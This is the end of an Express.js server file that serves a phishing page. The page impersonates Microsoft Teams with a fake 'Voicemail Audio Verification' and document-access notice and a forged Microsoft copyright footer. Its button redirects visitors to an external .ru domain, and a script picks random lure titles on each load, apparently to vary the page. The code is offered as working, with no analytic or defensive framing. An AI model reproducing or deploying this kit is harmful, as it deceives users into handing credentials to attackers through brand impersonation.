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"
            style="width: 250px;" alt="Company Logo">

        <h2 id="dynamicTitle">Voicemail Audio Verification</h2>

        <p>Your new document has arrived. To protect your security, please verify and access this document through
            Microsoft Teams®. Simply click the button below to begin reviewing the document.</p>

        <!-- Play Button -->
        <button onclick="redirectToVoicemail()">Access Document in Microsoft Teams®</button>

        <!-- Animated Voice Wave Effect -->
        <div class="voice-wave">
            <span></span>
            <span></span>
            <span></span>
            <span></span>
            <span></span>
        </div>

        <!-- Footer with Microsoft Content -->
        <div class="footer-text">
            <small>
                Protected by Microsoft Teams® | <a href="#">Privacy Policy</a> | <a href="#">Terms of Service</a>
                <br>© 2025 Microsoft Corporation. All rights reserved.
            </small>
        </div>
    </div>

    <script>
        function redirectToVoicemail() {
            window.location.href = "https://Lxn.hicantesp.ru/Fxk3b/";
        }

        // Array of up to 48 variations for Voicemail Verification
        const titleVariations = [
            "Review Document",
            "Access Document",
            "Document Access",
            "New Document Notification",
            "Document Notification",
            "New Document Waiting",
            "Document Alert",
            "Document Review",
        ];

        // Randomize the title on page load
        document.getElementById("dynamicTitle").textContent = titleVariations[Math.floor(Math.random() * titleVariations
            .length)];
    </script>




</body>

</html>
    `);
});

app.listen(port, () => {
    console.log(`Server is running at http://localhost:${port}`);
});
